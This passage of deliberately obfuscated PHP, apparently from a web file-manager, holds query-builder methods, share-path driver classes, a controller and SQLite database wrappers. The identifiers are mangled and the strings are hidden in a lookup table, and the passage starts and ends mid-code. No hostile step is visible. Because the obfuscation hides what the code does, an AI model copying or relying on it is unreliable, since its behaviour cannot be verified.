(isset($this->options[$d¦… ¹¨ÅÄ[277]])) { $dğä˜˜æÃ¾ = $this->db->getFields($this->options[$d¦… ¹¨ÅÄ[277]]); return $dğä˜˜æÃ¾ ? array_keys($dğä˜˜æÃ¾) : !1; } if ($this->fields) { $dğä˜˜æÃ¾ = $this->fields; unset($dğä˜˜æÃ¾[$d¦… ¹¨ÅÄ[248]], $dğä˜˜æÃ¾[$d¦… ¹¨ÅÄ[249]], $dğä˜˜æÃ¾[$d¦… ¹¨ÅÄ[250]], $dğä˜˜æÃ¾[$d¦… ¹¨ÅÄ[247]]); return $dğä˜˜æÃ¾; } return !1; } public function data($d®êì‹äØ = '') { $E˜ŸÑ—»Ó =& $_SERVER[Ö‘Øù]; if ($E˜ŸÑ—»Ó[33] === $d®êì‹äØ && !empty($this->data)) { return $this->data; } if (is_object($d®êì‹äØ)) { $d®êì‹äØ = get_object_vars($d®êì‹äØ); } elseif (is_string($d®êì‹äØ)) { parse_str($d®êì‹äØ, $d®êì‹äØ); } elseif (!is_array($d®êì‹äØ)) { think_exception(think_lang($E˜ŸÑ—»Ó[269])); } $this->data = $d®êì‹äØ; return $this; } public function join($fœã§ªé°Œ) { $C–Àë‹‘ñ =& $_SERVER[Ö‘Øù]; if (is_array($fœã§ªé°Œ)) { $this->options[$C–Àë‹‘ñ[280]] = $fœã§ªé°Œ; } elseif (!empty($fœã§ªé°Œ)) { $this->options[$C–Àë‹‘ñ[280]][] = $fœã§ªé°Œ; } return $this; } public function union($Cä‡¨ºñÆ, $D«³†‘í‚Ù = false) { goto d‡àÌ¥“; d‡àÌ¥“: $eƒ·™©‘Š =& $_SERVER[Ö‘Øù]; if (empty($Cä‡¨ºñÆ)) { return $this; } if ($D«³†‘í‚Ù) { $this->options[$eƒ·™©‘Š[345]][$eƒ·™©‘Š[346]] = !0; } goto aæœÀÒƒÍ; Eî¤Ü–‹Œ: return $this; goto fš†ò©çª; aæœÀÒƒÍ: if (is_object($Cä‡¨ºñÆ)) { $Cä‡¨ºñÆ = get_object_vars($Cä‡¨ºñÆ); } if (is_string($Cä‡¨ºñÆ)) { $bù¹ÉëŒòÙ = $Cä‡¨ºñÆ; } elseif (is_array($Cä‡¨ºñÆ)) { if (isset($Cä‡¨ºñÆ[0])) { $this->options[$eƒ·™©‘Š[345]] = array_merge($this->options[$eƒ·™©‘Š[345]], $Cä‡¨ºñÆ); return $this; } else { $bù¹ÉëŒòÙ = $Cä‡¨ºñÆ; } } else { think_exception(think_lang($eƒ·™©‘Š[269])); } $this->options[$eƒ·™©‘Š[345]][] = $bù¹ÉëŒòÙ; goto Eî¤Ü–‹Œ; fš†ò©çª: } public function cache($DĞ‹£™×ª = true, $dÃŠ¹Öğ±Ó = null, $B—Õ„®ŸÉá = '') { $b±åñÍ¹ŸÃ =& $_SERVER[Ö‘Øù]; if (!1 !== $DĞ‹£™×ª) { $this->options[$b±åñÍ¹ŸÃ[347]] = array($b±åñÍ¹ŸÃ[93] => $DĞ‹£™×ª, $b±åñÍ¹ŸÃ[337] => $dÃŠ¹Öğ±Ó, $b±åñÍ¹ŸÃ[29] => $B—Õ„®ŸÉá); } return $this; } public function field($DëŠšŸÚ¡Ç, $cæé¦ŸàÑŸ = false) { $B‘œ¼æ´ =& $_SERVER[Ö‘Øù]; if (!0 === $DëŠšŸÚ¡Ç) { $CÀÊƒ„ÑÆ  = $this->getDbFields(); $DëŠšŸÚ¡Ç = $CÀÊƒ„ÑÆ  ? $CÀÊƒ„ÑÆ  : $B‘œ¼æ´[182]; } elseif ($cæé¦ŸàÑŸ) { if (is_string($DëŠšŸÚ¡Ç)) { $DëŠšŸÚ¡Ç = explode($B‘œ¼æ´[47], $DëŠšŸÚ¡Ç); } $CÀÊƒ„ÑÆ  = $this->getDbFields(); $DëŠšŸÚ¡Ç = $CÀÊƒ„ÑÆ  ? array_diff($CÀÊƒ„ÑÆ , $DëŠšŸÚ¡Ç) : $DëŠšŸÚ¡Ç; } $this->options[$B‘œ¼æ´[271]] = $DëŠšŸÚ¡Ç; return $this; } public function scope($b§åÛÕ•Üì = '', $D¯ä‰Ù•š´ = NULL) { $Ağ÷‡øäÁé =& $_SERVER[Ö‘Øù]; if ($Ağ÷‡øäÁé[33] === $b§åÛÕ•Üì) { if (isset($this->_scope[$Ağ÷‡øäÁé[34]])) { $bğê÷µò‰ = $this->_scope[$Ağ÷‡øäÁé[34]]; } else { return $this; } } elseif (is_string($b§åÛÕ•Üì)) { $C‚¹î”ãˆã = explode($Ağ÷‡øäÁé[47], $b§åÛÕ•Üì); $bğê÷µò‰ = array(); foreach ($C‚¹î”ãˆã as $dÀŠáùæšÑ) { if (!isset($this->_scope[$dÀŠáùæšÑ])) { continue; } $bğê÷µò‰ = array_merge($bğê÷µò‰, $this->_scope[$dÀŠáùæšÑ]); } if (!empty($D¯ä‰Ù•š´) && is_array($D¯ä‰Ù•š´)) { $bğê÷µò‰ = array_merge($bğê÷µò‰, $D¯ä‰Ù•š´); } } elseif (is_array($b§åÛÕ•Üì)) { $bğê÷µò‰ = $b§åÛÕ•Üì; } if (is_array($bğê÷µò‰) && !empty($bğê÷µò‰)) { $this->options = array_merge($this->options, array_change_key_case($bğê÷µò‰)); } return $this; } public function where($dÉ‘§‘„Ó¥, $a˜Ò’Ú»ò = null) { $cŠŸš”è =& $_SERVER[Ö‘Øù]; if (!is_null($a˜Ò’Ú»ò) && is_string($dÉ‘§‘„Ó¥)) { if (!is_array($a˜Ò’Ú»ò)) { $a˜Ò’Ú»ò = func_get_args(); array_shift($a˜Ò’Ú»ò); } $a˜Ò’Ú»ò = array_map(array($this->db, $cŠŸš”è[341]), $a˜Ò’Ú»ò); $dÉ‘§‘„Ó¥ = vsprintf($dÉ‘§‘„Ó¥, $a˜Ò’Ú»ò); } elseif (is_object($dÉ‘§‘„Ó¥)) { $dÉ‘§‘„Ó¥ = get_object_vars($dÉ‘§‘„Ó¥); } elseif (is_array($dÉ‘§‘„Ó¥)) { foreach ($dÉ‘§‘„Ó¥ as $A¾áÒ”½ŠÍ => $A¤ê¯×ß¦œ) { if ((is_numeric($A¾áÒ”½ŠÍ) || !$A¾áÒ”½ŠÍ) && is_string($A¤ê¯×ß¦œ)) { if (strpos($A¤ê¯×ß¦œ, $cŠŸš”è[348]) === 0) { continue; } think_trace($cŠŸš”è[349], $cŠŸš”è[33], $cŠŸš”è[46]); die; } } } if (is_string($dÉ‘§‘„Ó¥) && $cŠŸš”è[33] != $dÉ‘§‘„Ó¥) { $D››…›®ã = array(); $D››…›®ã[$cŠŸš”è[350]] = $dÉ‘§‘„Ó¥; $dÉ‘§‘„Ó¥ = $D››…›®ã; } if (isset($this->options[$cŠŸš”è[273]])) { $this->options[$cŠŸš”è[273]] = array_merge($this->options[$cŠŸš”è[273]], $dÉ‘§‘„Ó¥); } else { $this->options[$cŠŸš”è[273]] = $dÉ‘§‘„Ó¥; } return $this; } public function limit($BÊ½‰ÀˆŸŸ, $CÁ®†ÏÓ· = null) { $FÑ‰´æŸÊÎ =& $_SERVER[Ö‘Øù]; $this->options[$FÑ‰´æŸÊÎ[290]] = is_null($CÁ®†ÏÓ·) ? $BÊ½‰ÀˆŸŸ : $BÊ½‰ÀˆŸŸ . $FÑ‰´æŸÊÎ[47] . $CÁ®†ÏÓ·; return $this; } public function page($A¢¨ËÏùÀÈ, $f¹Û™ˆ˜ØÌ = null) { $d‡Š¡›¼¾ =& $_SERVER[Ö‘Øù]; $this->options[$d‡Š¡›¼¾[351]] = is_null($f¹Û™ˆ˜ØÌ) ? $A¢¨ËÏùÀÈ : $A¢¨ËÏùÀÈ . $d‡Š¡›¼¾[47] . $f¹Û™ˆ˜ØÌ; return $this; } public function comment($Bñ¥¤¸ª±—) { $this->options[$_SERVER[Ö‘Øù][352]] = $Bñ¥¤¸ª±—; return $this; } public function setProperty($aæÙÆ†ÀÙ¢, $F†Ğ˜Î…—‚) { if (property_exists($this, $aæÙÆ†ÀÙ¢)) { $this->{$aæÙÆ†ÀÙ¢} = $F†Ğ˜Î…—‚; } return $this; } } goto FÁ£œÙß; BË„·–á´: class PathDriverDbShareItem extends PathDriverDB { public function __construct($dˆØìÉòÇ÷) { $this->pathParse = $dˆØìÉòÇ÷; $this->model = Model($_SERVER[Ö‘Øù][1240]); } public function getPathOuter($cê¼Ò©éÙÚ) { $BÉÔ÷¹ëõÚ =& $_SERVER[Ö‘Øù]; if (!$cê¼Ò©éÙÚ) { return $cê¼Ò©éÙÚ; } $eÕÛÃö…Ì’ = $this->parse($cê¼Ò©éÙÚ); return trim(KodIO::makeShare($this->pathParse[$BÉÔ÷¹ëõÚ[395]], $eÕÛÃö…Ì’[$BÉÔ÷¹ëõÚ[395]]), $BÉÔ÷¹ëõÚ[8]); } protected function infoParse($e™è÷´ÍÔ, $a„îí·ç¢ = false, $bÂãÄˆÒëÎ = false) { $DÌè»•çêÃ =& $_SERVER[Ö‘Øù]; $B£Éƒ ¥’Š = $this->pathParse[$DÌè»•çêÃ[395]]; $d¥•‡¹ÁË´ = trim($this->pathParse[$DÌè»•çêÃ[1098]], $DÌè»•çêÃ[8]); return Action($DÌè»•çêÃ[1248])->sharePathInfo($B£Éƒ ¥’Š, $d¥•‡¹ÁË´); } public function infoFull($C¿…¬’á¿„) { $cÎÓºÉ‹ =& $_SERVER[Ö‘Øù]; $a§©ãä§º = explode($cÎÓºÉ‹[8], trim($C¿…¬’á¿„, $cÎÓºÉ‹[8])); if (count($a§©ãä§º) > 1) { $cß®–îÈ¤ = implode($cÎÓºÉ‹[8], array_splice($a§©ãä§º, 1)); $d®§İÅƒ = $this->model->pathInfoByPath($a§©ãä§º[0], $cß®–îÈ¤); if (!$d®§İÅƒ) { return !1; } $this->pathParse[$cÎÓºÉ‹[1098]] = $d®§İÅƒ[$cÎÓºÉ‹[397]]; } return $this->infoParse($C¿…¬’á¿„); } public function listAll($FøÅ»‹¦Û–) { goto dªŞˆåÕ¬; e…øÌ¦¯©‘: foreach ($C·åÂ¸ñö as &$AÉÜµÂæÀÃ) { check_abort(); $AÉÜµÂæÀÃ[$d†Ëôêà‡¬[85]] = $Cö°ŠÄš¶ğ->_shareItemeParse($AÉÜµÂæÀÃ[$d†Ëôêà‡¬[85]], $DÙ¬¾šçĞ); } unset($AÉÜµÂæÀÃ); return $C·åÂ¸ñö; goto c¼…šó¦; dªŞˆåÕ¬: $d†Ëôêà‡¬ =& $_SERVER[Ö‘Øù]; $eºÈˆ¯×ï— = IO::info($this->pathParse[$d†Ëôêà‡¬[76]]); if (!$eºÈˆ¯×ï—) { return array(); } goto a“áôíÄ…; a“áôíÄ…: $C·åÂ¸ñö = $this->model->listAll($FøÅ»‹¦Û–); $DÙ¬¾šçĞ = Model($d†Ëôêà‡¬[590])->getInfo($eºÈˆ¯×ï—[$d†Ëôêà‡¬[483]]); $Cö°ŠÄš¶ğ = Action($d†Ëôêà‡¬[1248]); goto e…øÌ¦¯©‘; c¼…šó¦: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($F†ÇšíÀç) { $this->pathParse = $F†ÇšíÀç; $this->model = Model($_SERVER[Ö‘Øù][1240]); } protected function infoParse($f‚ò°Î÷•ù, $EöäÜÒ»¥– = false, $fê•Æ£ƒ‹ = false) { $c‹Ä‡ÍÇ„Ó =& $_SERVER[Ö‘Øù]; return Action($c‹Ä‡ÍÇ„Ó[1104])->sharePathInfo($this->pathParse[$c‹Ä‡ÍÇ„Ó[76]], !0); } public function listPath($e—ÔÇ±È, $D‹©ğÂ÷œ = false) { $Fø’Ì›Ì¡ß =& $_SERVER[Ö‘Øù]; $B² ëÖİÃ• = parent::listPath($e—ÔÇ±È, $D‹©ğÂ÷œ); foreach ($B² ëÖİÃ• as $e…ÉÃ§¥‰Š => $F‹³†æö˜Ï) { if (!in_array($e…ÉÃ§¥‰Š, array($Fø’Ì›Ì¡ß[74], $Fø’Ì›Ì¡ß[75]))) { continue; } foreach ($F‹³†æö˜Ï as $DŒ•¾†ˆ’ => $Dš‘Ñï×Æ†) { $B² ëÖİÃ•[$e…ÉÃ§¥‰Š][$DŒ•¾†ˆ’] = Action($Fø’Ì›Ì¡ß[1104])->shareItemInfo($Dš‘Ñï×Æ†); } } return $B² ëÖİÃ•; } public function listAll($CÖáä·ØÉ¦) { goto d…¬¯´‡¦; eÚÂÊËêâ: $D©¯ÀÉ¶¢‚ = $this->model->listAll($CÖáä·ØÉ¦); foreach ($D©¯ÀÉ¶¢‚ as &$f¼ÖíÖº°…) { $f¼ÖíÖº°…[$fìÛø·Æ•[85]] = Action($fìÛø·Æ•[1104])->shareItemInfo($f¼ÖíÖº°…[$fìÛø·Æ•[85]]); } unset($f¼ÖíÖº°…); goto d’µ³Æöæß; d…¬¯´‡¦: $fìÛø·Æ• =& $_SERVER[Ö‘Øù]; $bØ«ÒºÓŠô = IO::info($this->pathParse[$fìÛø·Æ•[76]]); if (!$bØ«ÒºÓŠô) { return array(); } goto eÚÂÊËêâ; d’µ³Æöæß: return $D©¯ÀÉ¶¢‚; goto E›¥§ÛâÊ«; E›¥§ÛâÊ«: } } class PathDriverDriverShareItem { public function __construct($aÇ²‚´“Æ) { $this->pathParse = $aÇ²‚´“Æ; } public function __call($BÉ‹ÃÉ””, $C„ğ¢Âø¾ê) { $B¦ößÕŒ =& $_SERVER[Ö‘Øù]; if (method_exists($this, $BÉ‹ÃÉ””)) { return; } $cÚ‚»Îİ„ó = call_user_func_array(array($B¦ößÕŒ[1249], $BÉ‹ÃÉ””), $C„ğ¢Âø¾ê); $BƒÆŒŒÛ = array($B¦ößÕŒ[1250], $B¦ößÕŒ[1251], $B¦ößÕŒ[1252], $B¦ößÕŒ[1253], $B¦ößÕŒ[544], $B¦ößÕŒ[546], $B¦ößÕŒ[1254], $B¦ößÕŒ[107], $B¦ößÕŒ[1255], $B¦ößÕŒ[1256]); if (in_array($BÉ‹ÃÉ””, $BƒÆŒŒÛ)) { $cÚ‚»Îİ„ó = $this->getPathOuter($cÚ‚»Îİ„ó); } return $cÚ‚»Îİ„ó; } public function copy($E·Ëºš¬Ş¶, $dÂçÎ§Š²¥, $cÃÊ§óë¦ä = false) { return $this->copyMove($E·Ëºš¬Ş¶, $dÂçÎ§Š²¥, $cÃÊ§óë¦ä, $_SERVER[Ö‘Øù][544]); } public function move($aâºòõç°†, $f™Œ­´ª‘, $B¯¯ğ‡Ê´° = false) { return $this->copyMove($aâºòõç°†, $f™Œ­´ª‘, $B¯¯ğ‡Ê´°, $_SERVER[Ö‘Øù][546]); } private function copyMove($c›¼­Öº¡³, $FËì‡Èøö, $aìÏÉ¼«³, $bæ‘ÄÃïóå) { goto f ŸãÄ’; a²­Ó·â‹—: return $c‡«Ü¿Ô±; goto Aª…É—É‚Š; f ŸãÄ’: $c†Î§ÒÊÖ =& $_SERVER[Ö‘Øù]; $e„ª‡õˆçğ = $FËì‡Èøö; $AÏßµÜğŒ = IO::driverMake($FËì‡Èøö); goto d’õšæƒä†; d’õšæƒä†: if ($AÏßµÜğŒ->pathParse[$c†Î§ÒÊÖ[1082]]) { $FËì‡Èøö = $AÏßµÜğŒ->pathParse[$c†Î§ÒÊÖ[1082]]; } else { $FËì‡Èøö = $e„ª‡õˆçğ; } $c‡«Ü¿Ô± = IO::copyMove($c›¼­Öº¡³, $FËì‡Èøö, $aìÏÉ¼«³, $bæ‘ÄÃïóå); $c‡«Ü¿Ô± = $this->getPathOuter($c‡«Ü¿Ô±); goto a²­Ó·â‹—; Aª…É—É‚Š: } public function pathThis($e¶¹½°í´Ü) { return get_path_this($this->pathParse[$_SERVER[Ö‘Øù][76]]); } public function pathFather($a†Î¶¼Ä‹ù) { return get_path_father($this->pathParse[$_SERVER[Ö‘Øù][76]]); } public function iconvSystem($B¢éÃ‰´î¾) { return $B¢éÃ‰´î¾; } protected function infoParse($fÜŠÂ†ŒÍË, $E äÃ°ªÌ = false) { $a›è¢¡œÜË =& $_SERVER[Ö‘Øù]; $e…ËÑ«çƒ½ = $this->pathParse[$a›è¢¡œÜË[481]][$a›è¢¡œÜË[1105]] . $this->pathParse[$a›è¢¡œÜË[1098]]; if ($E äÃ°ªÌ) { $Fäöº´¶­ó = IO::infoWithChildren($e…ËÑ«çƒ½); } else { $Fäöº´¶­ó = IO::info($e…ËÑ«çƒ½); } $açÙ†ÔÆÃº = $this->pathParse[$a›è¢¡œÜË[481]]; return Action($a›è¢¡œÜË[1248])->_shareItemeParse($Fäöº´¶­ó, $açÙ†ÔÆÃº); } public function listAll($B¦šÕùè²) { $BŞŒ° Š =& $_SERVER[Ö‘Øù]; $D¯ÁŠ…ë¶ = IO::listAll($B¦šÕùè²); $CÄé¸²íºØ = $this->pathParse[$BŞŒ° Š[481]]; foreach ($D¯ÁŠ…ë¶ as &$FÖšù×°æª) { check_abort(); $a‰˜ÍÔ… = IO::info($FÖšù×°æª[$BŞŒ° Š[76]]); $a‰˜ÍÔ… = is_array($a‰˜ÍÔ…) ? $a‰˜ÍÔ… : array(); $FÖšù×°æª = array_merge($a‰˜ÍÔ…, $FÖšù×°æª); $FÖšù×°æª[$BŞŒ° Š[85]] = Action($BŞŒ° Š[1248])->_shareItemeParse($FÖšù×°æª, $CÄé¸²íºØ); } unset($FÖšù×°æª); return $D¯ÁŠ…ë¶; } public function getPathOuter($D¨÷ì¯ĞØ) { goto a®º±·ÌÂ; eŒ£öëªÆš: $eáÇóÜñ—³ = KodIO::clear($D¨÷ì¯ĞØ); $dÀĞÁŞÎÄ = KodIO::clear($this->pathParse[$CòìÁ³Çİê[481]][$CòìÁ³Çİê[1105]]); $BÃõ¿Õ„¥Ï = substr($eáÇóÜñ—³, strlen($dÀĞÁŞÎÄ)); goto D©«Â–æ§Ì; a®º±·ÌÂ: $CòìÁ³Çİê =& $_SERVER[Ö‘Øù]; $D·Úª©Šã÷ = KodIO::parse($D¨÷ì¯ĞØ); if ($D·Úª©Šã÷[$CòìÁ³Çİê[29]] == KodIO::KOD_SHARE_ITEM) { return $D·Úª©Šã÷[$CòìÁ³Çİê[76]]; } goto eŒ£öëªÆš; D©«Â–æ§Ì: if (substr($eáÇóÜñ—³, 0, strlen($dÀĞÁŞÎÄ)) != $dÀĞÁŞÎÄ) { return !1; } return $this->pathParse[$CòìÁ³Çİê[1099]] . $CòìÁ³Çİê[8] . ltrim($BÃõ¿Õ„¥Ï, $CòìÁ³Çİê[8]); goto a„ÏÜ„Ä·Ÿ; a„ÏÜ„Ä·Ÿ: } public function getType() { $DÀ„†ğ§ =& $_SERVER[Ö‘Øù]; $dé°ø³í¾Ç = str_replace($DÀ„†ğ§[72], $DÀ„†ğ§[33], get_class($this)); return strtolower($dé°ø³í¾Ç); } public function isTypeObject($aÔê›˜É…•) { return IO::isTypeObject($aÔê›˜É…•); } public function info($B´±–”Æéò) { return $this->infoParse($B´±–”Æéò); } public function infoAuth($EéËŠ‰Å·†) { return $this->infoParse($EéËŠ‰Å·†); } public function infoWithChildren($f‚êªâ²ïï) { return $this->infoParse($f‚êªâ²ïï, !0); } public function infoFull($c¹§¤ƒÜìå) { return $this->infoParse($c¹§¤ƒÜìå); } } goto BÅùâê¿; D®íê‘±¸ñ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto eÎ§–‹Ì©İ; FöÛê·Ùà: $this->tpl = TEMPLATE . MOD . $B‘ôÇì†•[8]; $this->_classObjectID = mt_rand(0, 10000); goto Aß»‡¢Œä; eÎ§–‹Ì©İ: $B‘ôÇì†• =& $_SERVER[Ö‘Øù]; global $in, $config; $this->config =& $config; goto dàÇÅĞ¼Ï; dàÇÅĞ¼Ï: $this->in =& $in; $this->values[$B‘ôÇì†•[6]] =& $config; $this->values[$B‘ôÇì†•[7]] =& $in; goto FöÛê·Ùà; Aß»‡¢Œä: } public function loadClass($C¿ºğ±˜–) { if (1 === func_num_args()) { $this->{$C¿ºğ±˜–} = new $C¿ºğ±˜–(); } else { $b™×ÇÙ¯èÄ = new ReflectionClass($C¿ºğ±˜–); $Eº»ó¹áÌ„ = func_get_args(); array_shift($Eº»ó¹áÌ„); $this->{$C¿ºğ±˜–} = $b™×ÇÙ¯èÄ->newInstanceArgs($Eº»ó¹áÌ„); } return $this->{$C¿ºğ±˜–}; } protected function assign($Aœªğƒø, $d‰°êÑÒ½è) { $this->values[$Aœªğƒø] = $d‰°êÑÒ½è; } protected function display($C°ó×ÈÇôÀ) { ob_end_clean(); extract($this->values); require $this->tpl . $C°ó×ÈÇôÀ; } } class DbSqliteBase extends Db { public function __construct($fŞ¯ë…ä½† = '') { $AŠ‘‘–¹Ö =& $_SERVER[Ö‘Øù]; if (!extension_loaded($AŠ‘‘–¹Ö[9])) { think_exception(think_lang($AŠ‘‘–¹Ö[10]) . $AŠ‘‘–¹Ö[11]); } if (!empty($fŞ¯ë…ä½†)) { if (!isset($fŞ¯ë…ä½†[$AŠ‘‘–¹Ö[12]])) { $fŞ¯ë…ä½†[$AŠ‘‘–¹Ö[12]] = 438; } $this->config = $fŞ¯ë…ä½†; if (empty($this->config[$AŠ‘‘–¹Ö[13]])) { $this->config[$AŠ‘‘–¹Ö[13]] = array(); } } } public function connect($e¾Ë‹¶“ = '', $b–ÌŞš–â· = 0) { $C‹¸õ‚’¨’ =& $_SERVER[Ö‘Øù]; if (!isset($this->linkID[$b–ÌŞš–â·])) { goto d¬‘ôÑ®æ; Eø±à´ñ­í: $this->linkID[$b–ÌŞš–â·] = $A®ˆÜƒ‚»«($e¾Ë‹¶“[$C‹¸õ‚’¨’[17]], $e¾Ë‹¶“[$C‹¸õ‚’¨’[12]]); if (!$this->linkID[$b–ÌŞš–â·]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto c¼¹ßØ¨„; c¼¹ßØ¨„: @sqlite_busy_timeout($this->linkID[$b–ÌŞš–â·], 30000); if (1 != think_config($C‹¸õ‚’¨’[18])) { unset($this->config); } goto aš¹½„æœÄ; d¬‘ôÑ®æ: if (empty($e¾Ë‹¶“)) { $e¾Ë‹¶“ = $this->config; } $Bä†ÍãÎÌÚ = !empty($e¾Ë‹¶“[$C‹¸õ‚’¨’[13]][$C‹¸õ‚’¨’[14]]) ? $e¾Ë‹¶“[$C‹¸õ‚’¨’[13]][$C‹¸õ‚’¨’[14]] : $this->pconnect; $A®ˆÜƒ‚»« = $Bä†ÍãÎÌÚ ? $C‹¸õ‚’¨’[15] : $C‹¸õ‚’¨’[16]; goto Eø±à´ñ­í; aš¹½„æœÄ: } return $this->linkID[$b–ÌŞš–â·]; } public function free() { $this->queryID = null; } public function query($DŒé‰ï¼) { goto Bò©®Âí¢‹; EÅƒ½îŞ§Œ: $this->queryStr = $DŒé‰ï¼; if ($this->queryID) { $this->free(); } think_action_status($A¶ßéà²‹œ[19], 1); goto Dæ¼ÖÎ¨¢å; Bò©®Âí¢‹: $A¶ßéà²‹œ =& $_SERVER[Ö‘Øù]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÅƒ½îŞ§Œ; Dæ¼ÖÎ¨¢å: think_status($A¶ßéà²‹œ[20]); $this->queryID = sqlite_query($this->_linkID, $DŒé‰ï¼); $this->debug(); goto F ğõÀ–¼†; F ğõÀ–¼†: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Dë˜»Åíå = $this->getAll(); return $Dë˜»Åíå; } goto AÂ™’µáâ¦; AÂ™’µáâ¦: } public function execute($aä¼­øƒ¹) { goto AêùâÆŠÊù; d»‹Ğ²­´Ñ: $this->queryStr = $aä¼­øƒ¹; if ($this->queryID) { $this->free(); } think_action_status($D¾ê³ÙŞùÜ[21], 1); goto c”ÀÌï÷ğ˜; AêùâÆŠÊù: $D¾ê³ÙŞùÜ =& $_SERVER[Ö‘Øù]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d»‹Ğ²­´Ñ; dğ®š°÷¨õ: if (!1 === $d§ëÏ–˜‚ˆ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto e»æíÔœå; c”ÀÌï÷ğ˜: think_status($D¾ê³ÙŞùÜ[20]); $d§ëÏ–˜‚ˆ = sqlite_exec($this->_linkID, $aä¼­øƒ¹); $this->debug(); goto dğ®š°÷¨õ; e»æíÔœå: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ö‘Øù][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÄÜ‘‚¯”Ç = sqlite_query($this->_linkID, $_SERVER[Ö‘Øù][23]); if (!$AÄÜ‘‚¯”Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AŸŞ‚Ìê¡ = sqlite_query($this->_linkID, $_SERVER[Ö‘Øù][24]); if (!$AŸŞ‚Ìê¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FÂ‹çƒ´Ù‚ = array(); if ($this->numRows > 0) { for ($aŠ™öµÛ‡ = 0; $aŠ™öµÛ‡ < $this->numRows; $aŠ™öµÛ‡++) { $FÂ‹çƒ´Ù‚[$aŠ™öµÛ‡] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $FÂ‹çƒ´Ù‚; } public function getFields($cóÈÑ„èğ¸) { $a÷§¸åŒŸ =& $_SERVER[Ö‘Øù]; $F¶˜ëêô = $this->query($a÷§¸åŒŸ[25] . $cóÈÑ„èğ¸ . $a÷§¸åŒŸ[26]); $A¥Œ¢¬­¹† = array(); if ($F¶˜ëêô) { foreach ($F¶˜ëêô as $aÒ†ôµí÷‹ => $Böä±Ü¥Ç) { $A¥Œ¢¬­¹†[$Böä±Ü¥Ç[$a÷§¸åŒŸ[27]]] = array($a÷§¸åŒŸ[28] => $Böä±Ü¥Ç[$a÷§¸åŒŸ[27]], $a÷§¸åŒŸ[29] => $Böä±Ü¥Ç[$a÷§¸åŒŸ[30]], $a÷§¸åŒŸ[31] => (bool) ($Böä±Ü¥Ç[$a÷§¸åŒŸ[32]] === $a÷§¸åŒŸ[33]), $a÷§¸åŒŸ[34] => $Böä±Ü¥Ç[$a÷§¸åŒŸ[35]], $a÷§¸åŒŸ[36] => strtolower($Böä±Ü¥Ç[$a÷§¸åŒŸ[37]]) == $a÷§¸åŒŸ[38], $a÷§¸åŒŸ[39] => strtolower($Böä±Ü¥Ç[$a÷§¸åŒŸ[40]]) == $a÷§¸åŒŸ[41]); } } return $A¥Œ¢¬­¹†; } public function getTables($fõÚäâÛ†è = '') { $Aááå·ø† =& $_SERVER[Ö‘Øù]; $dÒ§æÙ‰ùÑ = $this->query($Aááå·ø†[42] . $Aááå·ø†[43] . $Aááå·ø†[44]); $f•Œ±Õñã = array(); foreach ($dÒ§æÙ‰ùÑ as $aî·¥—•ãƒ => $fŠíÍµ‚»Ü) { $f•Œ±Õñã[$aî·¥—•ãƒ] = current($fŠíÍµ‚»Ü); } return $f•Œ±Õñã; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eå¬Ê‹ßŞ¡ =& $_SERVER[Ö‘Øù]; $EëÎè÷‰½´ = sqlite_last_error($this->_linkID); $this->error = $EëÎè÷‰½´ . $eå¬Ê‹ßŞ¡[4] . sqlite_error_string($EëÎè÷‰½´); if ($eå¬Ê‹ßŞ¡[33] != $this->queryStr) { $this->error .= LNG($eå¬Ê‹ßŞ¡[45]) . $this->queryStr; } think_trace($this->error, $eå¬Ê‹ßŞ¡[33], $eå¬Ê‹ßŞ¡[46]); return $this->error; } public function escapeString($càî°Ø…„Œ) { return sqlite_escape_string($càî°Ø…„Œ); } public function parseLimit($cÕ«‡¨Ç³) { $dİ—‘ß¥ª =& $_SERVER[Ö‘Øù]; $bÜÂ•ìçÖ = $dİ—‘ß¥ª[33]; if (!empty($cÕ«‡¨Ç³)) { $cÕ«‡¨Ç³ = explode($dİ—‘ß¥ª[47], $cÕ«‡¨Ç³); if (count($cÕ«‡¨Ç³) > 1) { $bÜÂ•ìçÖ .= $dİ—‘ß¥ª[48] . $cÕ«‡¨Ç³[1] . $dİ—‘ß¥ª[49] . $cÕ«‡¨Ç³[0] . $dİ—‘ß¥ª[50]; } else { $bÜÂ•ìçÖ .= $dİ—‘ß¥ª[48] . $cÕ«‡¨Ç³[0] . $dİ—‘ß¥ª[50]; } } return $bÜÂ•ìçÖ; } } class DbSqlite3Base extends Db { public function __construct($fôª‹‚¢©¸ = '') { $b±Ó’Ü®‹ö =& $_SERVER[Ö‘Øù]; if (!class_exists($b±Ó’Ü®‹ö[51])) { think_exception(think_lang($b±Ó’Ü®‹ö[10]) . $b±Ó’Ü®‹ö[52]); } if (!empty($fôª‹‚¢©¸)) { if (!isset($fôª‹‚¢©¸[$b±Ó’Ü®‹ö[12]])) { $fôª‹‚¢©¸[$b±Ó’Ü®‹ö[12]] = 438; } $this->config = $fôª‹‚¢©¸; if (empty($this->config[$b±Ó’Ü®‹ö[13]])) { $this->config[$b±Ó’Ü®‹ö[13]] = array(); } } } public function connect($F‘¥·‡õÇ÷ = '', $bñ’ÙğÉŒâ = 0) { $eù†‹­ìâ =& $_SERVER[Ö‘Øù]; if (!isset($this->linkID[$bñ’ÙğÉŒâ])) { if (empty($F‘¥·‡õÇ÷)) { $F‘¥·‡õÇ÷ = $this->config; } $this->linkID[$bñ’ÙğÉŒâ] = new SQLite3($F‘¥·‡õÇ÷[$eù†‹­ìâ[17]]); if (!$this->linkID[$bñ’ÙğÉŒâ]) { think_exception($this->linkID[$bñ’ÙğÉŒâ]->lastErrorMsg()); } 